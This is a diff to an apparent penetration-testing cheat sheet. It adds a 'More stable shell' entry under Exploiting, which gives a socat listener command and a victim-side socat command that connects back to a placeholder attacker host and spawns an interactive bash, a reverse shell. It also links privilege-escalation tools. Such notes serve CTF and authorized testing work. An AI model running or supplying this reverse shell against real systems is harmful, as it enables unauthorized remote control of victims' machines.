@@ -46,6 +46,12 @@ DNS Enumeration Script
 
 ## Exploiting
 
+More stable shell
+
+### Socat  
+On the attacker machine, run the command ```socat TCP-L:<PORT> FILE:`tty`,raw,echo=0```  
+On the victim machine run the command ```socat TCP:<attacker-ip>:<attacker-port> exec:"bash -li",pty,stderr,sigint,setsid,sane```
+
 ## Priv Esc
 
 [linPEAS/winPEAS](https://github.com/carlospolop/PEASS-ng)  
